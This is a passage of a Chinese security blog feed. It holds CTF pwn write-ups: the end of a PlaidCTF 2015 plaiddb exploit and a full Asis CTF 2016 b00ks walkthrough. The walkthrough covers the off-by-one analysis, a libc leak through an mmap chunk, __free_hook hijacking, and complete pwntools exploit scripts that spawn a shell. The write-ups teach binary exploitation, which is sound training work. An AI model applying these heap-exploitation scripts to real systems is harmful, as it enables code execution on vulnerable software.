class="token punctuation">)</span><span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token number">6</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_leak: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_leak<span class="token punctuation">)</span><span class="token punctuation">)</span>__malloc_hook_addr <span class="token operator">=</span> libc_leak <span class="token operator">-</span> <span class="token number">88</span> <span class="token operator">-</span> <span class="token number">0x10</span>libc_base <span class="token operator">=</span> __malloc_hook_addr <span class="token operator">-</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__malloc_hook'</span><span class="token punctuation">]</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base: '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># 这些块物理相连，a*58 之后正好是 5 块的 size 和 fd，修改即可控制下一个 fast bin 的位置</span><span class="token comment"># -0x10 是为了留出指针空间，-3 是为了把指针所指的 __malloc_hook 处的 7f 地址提前，当成 pre_size 相关内容，否则 fake_fast bin 格式不符合要求</span><span class="token comment"># debug()</span>PUT<span class="token punctuation">(</span><span class="token string">b'fastatk'</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x58</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x71</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>__malloc_hook_addr <span class="token operator">-</span> <span class="token number">0x10</span> <span class="token operator">+</span> <span class="token number">5</span> <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>PUT<span class="token punctuation">(</span><span class="token string">b'prepare'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'prepare data'</span><span class="token punctuation">)</span>one_gadget <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>PUT<span class="token punctuation">(</span><span class="token string">b'attack'</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">3</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>one_gadget<span class="token punctuation">)</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">b'DEL'</span><span class="token punctuation">)</span> <span class="token comment"># malloc(8) 出发 one_gadget</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h1 id="结果"><a href="#结果" class="headerlink" title="结果"></a>结果</h1><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90plaidctf%202015%E3%80%91plaiddb32.png" alt="【plaidctf 2015】plaiddb32.png"></p>]]></content>
    
    
    <summary type="html">这道题知识点较多，漏洞利用较复杂，利用 off-by-one 漏洞造成 Overlap 来泄露 libc 基地址，并通过 fast bin attack 错位伪造 chunk 劫持 __malloc_hook 为 one_gadget 来 getshell，要求对堆的分配机制较为熟练</summary>
    
    
    
    <category term="二进制漏洞利用" scheme="https://www.uf4te.cn/categories/%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"/>
    
    
    <category term="CTF" scheme="https://www.uf4te.cn/tags/CTF/"/>
    
    <category term="Pwn" scheme="https://www.uf4te.cn/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>【Asis CTF 2016】b00ks</title>
    <link href="https://www.uf4te.cn/posts/18c02ebd.html"/>
    <id>https://www.uf4te.cn/posts/18c02ebd.html</id>
    <published>2024-05-29T11:15:04.000Z</published>
    <updated>2024-06-05T06:36:53.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="收获"><a href="#收获" class="headerlink" title="收获"></a>收获</h1><ul><li><p>利用 off-by-one 漏洞修改指向堆的指针，并在修改后的指针指向的堆地址处伪造一个堆块</p></li><li><p><mark>利用 <code>mmap</code> 分配的内存与 libc 之前存在固定的偏移的特点，推算出 libc 的基地址</mark></p></li><li><p><mark>由于 <code>unsorted bin</code> 是双向链表，利用第一个 <code>unsorted bin</code> 的 <code>bk</code> 指针指向 libc 中的地址的特点，根据偏移得到 <code>__malloc_hook</code> 真实地址，进而通过 <code>__malloc_hook</code> 的 libc 偏移计算 libc 基地址</mark></p></li><li><p>通过劫持 <code>__free_hook</code> 为 <code>system()</code> 或 one_gadget 来获得 shell</p></li></ul><hr><p><a href="https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks">【Asis CTF 2016】b00ks</a></p><hr><h1 id="思路一（mmap）"><a href="#思路一（mmap）" class="headerlink" title="思路一（mmap）"></a>思路一（mmap）</h1><blockquote><p>本地环境：Glibc 2.23</p></blockquote><p>查看保护：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks1.png" alt="【Asis CTF 2016】b00ks1.png"></p><p>IDA 下分析：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks2.png" alt="【Asis CTF 2016】b00ks2.png"></p><p>一个菜单题，根据功能选项，将相应功能的函数重命名</p><p><code>Menu()</code> 菜单：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks3.png" alt="【Asis CTF 2016】b00ks3.png"></p><p><code>Create()</code> 创建：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks5.png" alt="【Asis CTF 2016】b00ks5.png"></p><p><code>Delete()</code> 删除：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks6.png" alt="【Asis CTF 2016】b00ks6.png"></p><p><code>Edit()</code> 编辑：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks7.png" alt="【Asis CTF 2016】b00ks7.png"></p><p><code>Print()</code> 打印：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks8.png" alt="【Asis CTF 2016】b00ks8.png"></p><p><code>Change()</code> 修改作者名：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks9.png" alt="【Asis CTF 2016】b00ks9.png"></p><p>程序在刚开始执行 <code>Menu()</code> 显示菜单之前，会在 <code>Change()</code> 中先让输入作者名 <code>author name</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks4.png" alt="【Asis CTF 2016】b00ks4.png"></p><p>这里的输入由自定义的 <code>my_read()</code> 实现：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks10.png" alt="【Asis CTF 2016】b00ks10.png"></p><p>仔细观察 <code>my_read()</code> 可以发现，这里是存在漏洞的：如果我们输入的字符串长度 <code>a2 = 1</code>，实际上会读入 2 个字符，第二个字符 <code>&#39;\n&#39;</code> 会被赋值为 <code>&#39;\x00&#39;</code></p><p>作者名 <code>author name</code> 写入的地址位于 BSS 段的 <code>unk_202040</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks11.png" alt="【Asis CTF 2016】b00ks11.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks12.png" alt="【Asis CTF 2016】b00ks12.png"></p><p>在 <code>Create()</code> 中创建书时，如果已存在的书的数量 <code>v2 &lt; 20</code>（未存满），会通过 <code>malloc</code> 分配 0x20 的空间来存放书的结构</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks13.png" alt="【Asis CTF 2016】b00ks13.png"></p><p>并将 <code>malloc</code> 分配的空间首地址存储在 <code>off_202010 + v2</code> 的地方，可以看到其存放在 BSS 段的 <code>unk_202060</code> 处：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks14.png" alt="【Asis CTF 2016】b00ks14.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks16.png" alt="【Asis CTF 2016】b00ks16.png"></p><p>分析可知，书的结构包括：</p><ul><li>书的序号 <code>book_id</code></li><li>书名 <code>name</code></li><li>书的描述 <code>description</code></li><li>书的描述的大小 <code>size</code></li></ul><p>为了方便理解，用图表示出来就是这样：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks15.png" alt="【Asis CTF 2016】b00ks15.png"></p><p>上图中，橙色区域存储作者名 <code>author name</code>，绿色区域存储的是书的数组 <code>book[]</code></p><blockquote><p><strong>有多少本书就有多少个 <code>book[]</code> 数组元素，<code>book[]</code> 的每一个数组元素都是一个指针，指向堆中的一个结构体</strong></p><p>这个结构体有四个属性：书的序号 <code>book_id</code>、书名 <code>name</code>、书的描述 <code>description</code> 和书的描述的大小 <code>size</code></p></blockquote><p>由于这里 <code>unk_202040</code> 和 <code>unk_202060</code> 刚好相距 0x20，因此 <code>my_read(off_202018, 32LL)</code> 处存在 off-by-one 漏洞，刚好溢出 1 字节</p><p>为了泄露出堆中的地址，可以借助存储在 <code>unk_202060</code> 中的指针，而在 <code>Print()</code> 中会将 <code>unk_202040</code> 处存储的 <code>author name</code> 通过 <code>%s</code> 打印出来：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks17.png" alt="【Asis CTF 2016】b00ks17.png"></p><p>因此，我们首先向 <code>unk_202040</code> 写入 0x20 个字节，将空间全部填满，这样就不存在 <code>&#39;\x00&#39;</code> 截断，由于 <code>my_read()</code> 还会多写入 1 字节 <code>&#39;\x00&#39;</code> 覆盖 <code>book[0]</code> 的最低位，但是不影响，因为当我们创建 <code>book[0]</code> 的时候多出的那 1 字节 <code>&#39;\x00&#39;</code> 又会被 <code>book[0]</code> 存储的指针给覆盖掉</p><p>当我们创建好 <code>book[0]</code> 后，此时 <code>unk_202040</code> 与 <code>book[0]</code> 是直接相连的，中间不存在 <code>&#39;\x00&#39;</code> 截断，因此我们只需要调用一次 <code>Print()</code> 就可以泄露出 <code>book[0]</code> 存储的指针</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks18.png" alt="【Asis CTF 2016】b00ks18.png"></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks19.png" alt="【Asis CTF 2016】b00ks19.png"></p><p>创建两本书进行测试，发现两个 <code>book[]</code> 存储的指针之间的偏移是 0x30：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks21.png" alt="【Asis CTF 2016】b00ks21.png"></p><p>堆中的存储结构如下：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks22.png" alt="【Asis CTF 2016】b00ks22.png"></p><p>因此根据 <code>book[0]</code> 存储的指针我们可以推算出 <code>book[1]</code> 存储的指针，即：<code>book[1] = book[0] + 0x30</code></p><p>由于这个题开启了 PIE，我们暂时无法泄露 libc 的基地址</p><p>但发现 <code>Create()</code> 创建书的时候，大小是由我们控制的：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks20.png" alt="【Asis CTF 2016】b00ks20.png"></p><p>因此我们可以让堆以 <code>mmap</code> 模式进行拓展，即：设定一个很大的尺寸（大于等于 <code>128KB</code>），创建一个 <code>book[1]</code></p><blockquote><p>因为 <code>brk</code> 是直接拓展原来的堆，而 <code>mmap</code> 会单独映射一块内存</p><p><strong><code>mmap</code> 分配的内存与 libc 之前存在固定的偏移，因此可以推算出 libc 的基地址</strong></p></blockquote><p>由于我们还可以再次使用 <code>Change()</code> 功能来写入作者名 <code>author name</code>，此时如果写入 0x20 字节，则溢出的一字节 <code>&#39;\x00&#39;</code> 会直接将已有的 <code>book[0]</code> 存储的指针最低位覆盖掉，从而改变了 <code>book[0]</code> 指向堆中的地址</p><p>可以看到，原本 <code>book[0]</code> 存储的指针最低位为 <code>&#39;\x60&#39;</code>，此时已被覆盖为 <code>&#39;\x00&#39;</code></p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks25.png" alt="【Asis CTF 2016】b00ks25.png"></p><p>进而我们可以通过 <code>Edit()</code> 功能修改 <code>book[0] -&gt; description</code> 的内容来伪造 <code>book[0]</code> 的结构体，此时伪造的 <code>book[0] -&gt; name</code> 和 <code>book[0] -&gt; description</code> 都可以由我们来定义</p><blockquote><p>注意：</p><p>由于我们覆盖了原本 <code>book[0]</code> 存储的指针最低位为 <code>&#39;\x00&#39;</code>，因此伪造的 <code>book[0]</code> 结构体首地址应该在地址最低位为 <code>&#39;\x00&#39;</code> 的地方，偏移为 0x40，因此先填充 0x40 的垃圾数据</p></blockquote><p>伪造前：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks23.png" alt="【Asis CTF 2016】b00ks23.png"></p><p>伪造后：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks24.png" alt="【Asis CTF 2016】b00ks24.png"></p><p>这里我们将伪造的 <code>book[0] -&gt; name</code> 和 <code>book[0] -&gt; description</code> 都设置为 <code>book[1]</code> 的 <code>book[1] -&gt; name</code> 的地址</p><p>因为此时我们只要能泄露 <code>book[1] -&gt; name</code> 就可以通过 <code>book[1] -&gt; name</code> 与 libc 基地址的偏移来计算出 libc 基地址了</p><p>通过 GDB 得到 <code>book[1] -&gt; name</code> 与 libc 基地址的偏移为 <code>0x5b0010</code>：</p><p><img src="https://blog-markdown-1317553172.cos.ap-nanjing.myqcloud.com/%E3%80%90Asis%20CTF%202016%E3%80%91b00ks26.png" alt="【Asis CTF 2016】b00ks26.png"></p><p>利用 <code>(book[1] -&gt; name) - 0x5b0010</code> 泄露出 libc 基地址后，直接劫持 <code>__free_hook</code> 为 <code>system()</code> 地址，然后通过 <code>Delete()</code> 功能调用 <code>free()</code> 实现 <code>system(/bin/sh)</code></p><p>也可以直接劫持 <code>__free_hook</code> 为 one_gadget 来 getshell</p><hr><h1 id="脚本一"><a href="#脚本一" class="headerlink" title="脚本一"></a>脚本一</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token comment"># 设置系统架构, 打印调试信息</span><span class="token comment"># arch 可选 : i386 / amd64 / arm / mips</span>context<span class="token punctuation">(</span>os<span class="token operator">=</span><span class="token string">'linux'</span><span class="token punctuation">,</span> arch<span class="token operator">=</span><span class="token string">'amd64'</span><span class="token punctuation">,</span> log_level<span class="token operator">=</span><span class="token string">'debug'</span><span class="token punctuation">)</span><span class="token comment"># PWN 远程 : content = 0, PWN 本地 : content = 1</span>content <span class="token operator">=</span> <span class="token number">1</span>elf <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">"/lib/x86_64-linux-gnu/libc.so.6"</span><span class="token punctuation">)</span><span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span><span class="token comment"># 将本地的 Linux 程序启动为进程 io</span>    io <span class="token operator">=</span> process<span class="token punctuation">(</span><span class="token string">"./b00ks"</span><span class="token punctuation">)</span><span class="token comment"># 附加 gdb 调试</span><span class="token keyword">def</span> <span class="token function">debug</span><span class="token punctuation">(</span>cmd<span class="token operator">=</span><span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> content <span class="token operator">==</span> <span class="token number">1</span><span class="token punctuation">:</span>   <span class="token comment"># 只有本地才可调试，远程无法调试</span>        gdb<span class="token punctuation">.</span>attach<span class="token punctuation">(</span>io<span class="token punctuation">,</span> cmd<span class="token punctuation">)</span>        pause<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Create</span><span class="token punctuation">(</span>name_size<span class="token punctuation">,</span> name<span class="token punctuation">,</span> des_size<span class="token punctuation">,</span> des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>name_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>des_size<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Delete</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"2"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Edit</span><span class="token punctuation">(</span>book_id<span class="token punctuation">,</span> new_des<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"3"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>book_id<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>new_des<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Print</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"4"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">Change</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"> "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">"5"</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">": "</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>name<span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'Enter author name: '</span><span class="token punctuation">)</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span>io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>   <span class="token comment"># 将 author name 的空间填充满，使其不存在 '\x00'</span>Create<span class="token punctuation">(</span><span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'bbbb'</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">)</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>book1_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book1_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book1_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>book2_addr <span class="token operator">=</span> book1_addr <span class="token operator">+</span> <span class="token number">0x30</span>   <span class="token comment"># 根据调试可知，两个堆块之间的偏移为 0x30</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Create<span class="token punctuation">(</span><span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token string">b'cccc'</span><span class="token punctuation">,</span> <span class="token number">0x21000</span><span class="token punctuation">,</span> <span class="token string">b'dddd'</span><span class="token punctuation">)</span>   <span class="token comment"># 以 mmap 方式创建堆块</span>payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x40</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>book2_addr <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span><span class="token number">0x1000</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>   <span class="token comment"># 伪造 book[0]</span><span class="token comment"># debug()</span>Change<span class="token punctuation">(</span><span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x20</span><span class="token punctuation">)</span>   <span class="token comment"># 覆盖 book[0] 的最低位，改变其指向的地址为伪造的 book[0]</span>Print<span class="token punctuation">(</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'Name: '</span><span class="token punctuation">)</span>book2_name_addr <span class="token operator">=</span> u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>   <span class="token comment"># 泄露出 book[1] -> name</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'book2_name_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>book2_name_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>libc_base <span class="token operator">=</span> book2_name_addr <span class="token operator">-</span> <span class="token number">0x5b0010</span>   <span class="token comment"># 根据偏移计算 libc 基地址</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'libc_base -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>free_hook_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'__free_hook'</span><span class="token punctuation">]</span>system_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>bin_sh_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>one_gadget_addr <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x4527a</span>   <span class="token comment"># 0x45226 0x4527a 0xf03a4 0xf1247</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'free_hook_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'system_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'bin_sh_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">'one_gadget_addr -> '</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>one_gadget_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># system(/bin/sh) 和 one_gadget 选其一即可</span>Edit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>bin_sh_addr<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>free_hook_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>Edit<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> p64<span class="token punctuation">(</span>system_addr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token comment"># Edit(1, p64(0) + p64(free_hook_addr))</span><span class="token comment"># Edit(2, p64(one_gadget_addr))</span>Delete<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" 